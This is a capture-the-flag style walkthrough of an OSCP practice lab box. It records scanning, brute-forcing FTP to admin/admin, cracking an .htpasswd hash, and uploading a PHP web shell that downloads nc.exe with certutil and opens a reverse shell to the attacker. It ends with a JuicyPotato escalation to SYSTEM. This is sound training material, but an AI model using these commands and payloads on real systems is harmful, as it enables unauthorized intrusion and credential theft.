## Nmap

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Slort]
└─$ sudo nmap -p- -n -vvv 192.168.199.46
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-24 22:40 CST
Initiating Ping Scan at 22:40
Scanning 192.168.199.46 [4 ports]
Completed Ping Scan at 22:40, 2.34s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 22:40
Scanning 192.168.199.46 [65535 ports]
Discovered open port 3389/tcp on 192.168.199.46
Discovered open port 21/tcp on 192.168.199.46
SYN Stealth Scan Timing: About 3.94% done; ETC: 22:53 (0:12:36 remaining)
SYN Stealth Scan Timing: About 9.08% done; ETC: 22:51 (0:10:11 remaining)
SYN Stealth Scan Timing: About 14.38% done; ETC: 22:51 (0:09:02 remaining)
SYN Stealth Scan Timing: About 20.50% done; ETC: 22:50 (0:07:49 remaining)
SYN Stealth Scan Timing: About 26.06% done; ETC: 22:50 (0:07:08 remaining)
SYN Stealth Scan Timing: About 32.77% done; ETC: 22:49 (0:06:11 remaining)
SYN Stealth Scan Timing: About 42.55% done; ETC: 22:50 (0:05:42 remaining)
SYN Stealth Scan Timing: About 48.43% done; ETC: 22:50 (0:05:08 remaining)
SYN Stealth Scan Timing: About 53.85% done; ETC: 22:50 (0:04:33 remaining)
SYN Stealth Scan Timing: About 59.63% done; ETC: 22:50 (0:04:00 remaining)
SYN Stealth Scan Timing: About 64.77% done; ETC: 22:50 (0:03:29 remaining)
SYN Stealth Scan Timing: About 72.26% done; ETC: 22:50 (0:02:39 remaining)
Discovered open port 3145/tcp on 192.168.199.46
SYN Stealth Scan Timing: About 79.77% done; ETC: 22:49 (0:01:53 remaining)
SYN Stealth Scan Timing: About 85.23% done; ETC: 22:49 (0:01:23 remaining)
Discovered open port 242/tcp on 192.168.199.46
SYN Stealth Scan Timing: About 90.78% done; ETC: 22:50 (0:00:53 remaining)
Completed SYN Stealth Scan at 22:49, 554.93s elapsed (65535 total ports)
Nmap scan report for 192.168.199.46
Host is up, received echo-reply ttl 125 (0.26s latency).
Scanned at 2023-08-24 22:40:34 CST for 555s
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON
21/tcp   open  ftp           syn-ack ttl 125
242/tcp  open  direct        syn-ack ttl 125
3145/tcp open  csi-lfap      syn-ack ttl 125
3389/tcp open  ms-wbt-server syn-ack ttl 125

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 557.39 seconds
           Raw packets sent: 131423 (5.783MB) | Rcvd: 347 (15.248KB)


┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Slort]
└─$ sudo nmap -A -sV -sS -T4 192.168.199.46 -p 21,242,3145,3389
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-24 22:51 CST
Nmap scan report for 192.168.199.46
Host is up (0.27s latency).

PORT     STATE SERVICE            VERSION
21/tcp   open  ftp                zFTPServer 6.0 build 2011-10-17
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| total 9680
| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat
| ----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
| ----------   1 root     root           17 Aug 13  2011 StopService.bat
| ----------   1 root     root           18 Aug 13  2011 StartService.bat
| ----------   1 root     root         8736 Nov 09  2011 Settings.ini
| dr-xr-xr-x   1 root     root          512 Aug 24 21:51 log
| ----------   1 root     root         2275 Aug 08  2011 LICENSE.htm
| ----------   1 root     root           23 Feb 10  2011 InstallService.bat
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
|_dr-xr-xr-x   1 root     root          512 Feb 18  2023 accounts
242/tcp  open  http               Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
|_http-title: 401 Authorization Required
| http-auth:
| HTTP/1.1 401 Authorization Required\x0D
|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8
3145/tcp open  zftp-admin         zFTPServer admin
3389/tcp open  ssl/ms-wbt-server?
| rdp-ntlm-info:
|   Target_Name: LIVDA
|   NetBIOS_Domain_Name: LIVDA
|   NetBIOS_Computer_Name: LIVDA
|   DNS_Domain_Name: LIVDA
|   DNS_Computer_Name: LIVDA
|   Product_Version: 6.0.6001
|_  System_Time: 2023-08-24T14:52:28+00:00
|_ssl-date: 2023-08-24T14:52:35+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=LIVDA
| Not valid before: 2023-01-28T03:26:23
|_Not valid after:  2023-07-30T03:26:23
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows 8.1 R1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 or 2008 Beta 3 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   260.77 ms 192.168.45.1
2   260.68 ms 192.168.45.254
3   260.87 ms 192.168.251.1
4   261.25 ms 192.168.199.46

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.82 seconds
```

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Slort]
└─$ searchsploit zFTPServer
------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
zFTPServer - 'cwd/stat' Remote Denial of Service                                           | windows/dos/18028.py
zFTPServer Suite 6.0.0.52 - 'rmdir' Directory Traversal                                    | windows/remote/18235.pl
------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Slort]
└─$ searchsploit -m 18235
  Exploit: zFTPServer Suite 6.0.0.52 - 'rmdir' Directory Traversal
      URL: https://www.exploit-db.com/exploits/18235
     Path: /usr/share/exploitdb/exploits/windows/remote/18235.pl
    Codes: CVE-2011-4717, OSVDB-77640
 Verified: False
File Type: Perl script text executable
Copied to: /home/ouyang/offensive-security/OSCP/Slort/18235.pl
```

依照版本判斷，18235 應可被利用，但嘗試後無法成功利用

另外發現 ftp 可用 anonymous / anonymous 登入，但登入後無法 get 檔案也無法往回 cd 到其他資料夾，猜測可能權限不足，嘗試用 hydra 爆破其他帳密

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/AuthBy]
└─$ hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.199.46 ftp
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-24 23:06:21
[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
[DATA] attacking ftp://192.168.199.46:21/
[21][ftp] host: 192.168.199.46   login: anonymous   password: anonymous
[21][ftp] host: 192.168.199.46   login: admin   password: admin
[21][ftp] host: 192.168.199.46   login: Admin   password: admin
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-08-24 23:06:28
```

發現還可用 admin/admin 登入

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/AuthBy]
└─$ ftp 192.168.199.46
Connected to 192.168.199.46.
220 zFTPServer v6.0, build 2011-10-17 15:25 ready.
Name (192.168.199.46:ouyang): admin
331 User name received, need password.
Password:
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||2051|)
150 Opening connection for /bin/ls.
total 3
-r--r--r--   1 root     root           76 Nov 08  2011 index.php
-r--r--r--   1 root     root           45 Nov 08  2011 .htpasswd
-r--r--r--   1 root     root          161 Nov 08  2011 .htaccess
226 Closing data connection.
ftp> get .htpasswd
local: .htpasswd remote: .htpasswd
229 Entering Extended Passive Mode (|||2052|)
150 File status okay; about to open data connection.
100% |********************************************************************************|    45      246.88 KiB/s    00:00 ETA
226 Closing data connection.
45 bytes received in 00:00 (0.17 KiB/s)
```

發現有 .htpasswd 檔案，嘗試下載成功

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/AuthBy]
└─$ cat .htpasswd
offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
```

得到 offsec hash，透過 john 來破解

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/AuthBy]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 ASIMD 4x2])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
elite            (offsec)
1g 0:00:00:00 DONE (2023-08-24 23:11) 2.631g/s 66526p/s 66526c/s 66526C/s glamorous1..booboo7
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

得到帳密!

```json
offsec/elite
```

嘗試登入 port 242 服務並成功！

![[截圖 2023-08-24 下午11.15.46.png]]![[截圖 2023-08-24 下午11.16.13.png]]

嘗試透過 ftp 上傳 reverse shell 並透過 web 執行

```json
ftp> put php-reverse-shell.php
local: php-reverse-shell.php remote: php-reverse-shell.php
229 Entering Extended Passive Mode (|||2056|)
150 File status okay; about to open data connection.
100% |********************************************************************************|  5496       16.85 MiB/s    00:00 ETA
226 Closing data connection.
5496 bytes sent in 00:00 (20.85 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||2057|)
150 Opening connection for /bin/ls.
total 9
-r--r--r--   1 root     root         5496 Aug 24 22:22 php-reverse-shell.php
-r--r--r--   1 root     root           76 Nov 08  2011 index.php
-r--r--r--   1 root     root           45 Nov 08  2011 .htpasswd
-r--r--r--   1 root     root          161 Nov 08  2011 .htaccess
226 Closing data connection.
```

用 kali 原生 php-reverse-shell 失敗，改用 [Github](https://github.com/ucc-hk/OSCP-Kit/blob/master/File%20Transfer.md)

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/AuthBy]
└─$ cat shell.php
<?php echo shell_exec('certutil.exe -urlcache -split -f "http://192.168.45.157:8000/nc.exe" nc.exe && nc.exe -nv 192.168.45.157 4444 -e cmd.exe');?>
```

Get shell!

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/AuthBy]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.157] from (UNKNOWN) [192.168.199.46] 49176
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\wamp\www>
```


```json
C:\>whoami /all
whoami /all

USER INFORMATION
----------------

User Name    SID
============ =============================================
livda\apache S-1-5-21-1204100616-2260006253-652133421-1000


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Unknown SID type S-1-16-12288 Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

C:\Users\apache\Desktop>systeminfo
systeminfo

Host Name:                 LIVDA
OS Name:                   Microsoftr Windows Serverr 2008 Standard
OS Version:                6.0.6001 Service Pack 1 Build 6001
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                92573-OEM-7502905-27565
Original Install Date:     12/19/2009, 11:25:57 AM
System Boot Time:          8/24/2023, 7:29:53 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,655 MB
Page File: Max Size:       1,985 MB
Page File: Available:      1,536 MB
Page File: In Use:         449 MB
Page File Location(s):     N/A
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           N/A
```

因為為 win2008 且有 SeImpersonatePrivilege 權限，嘗試使用 JuicyPotato 提權，但因其為 x86 系統，需使用 x86 之版本

[JuicyPotato CLSID](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise/)
```json
C:\wamp\www>.\Juicy.Potato.x86.exe -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -p c:\windows\system32\cmd.exe -a "/c c:\wamp\www\nc.exe -e cmd.exe 192.168.45.197 5555" -t *
.\Juicy.Potato.x86.exe -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -p c:\windows\system32\cmd.exe -a "/c c:\wamp\www\nc.exe -e cmd.exe 192.168.45.197 5555" -t *
Testing {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} 1337
....
[+] authresult 0
{9B1F122C-2982-4e91-AA8B-E071D54F2A4D};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/AuthBy]
└─$ nc -nvlp 5555
listening on [any] 5555 ...
connect to [192.168.45.197] from (UNKNOWN) [192.168.199.46] 49259
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\syste
```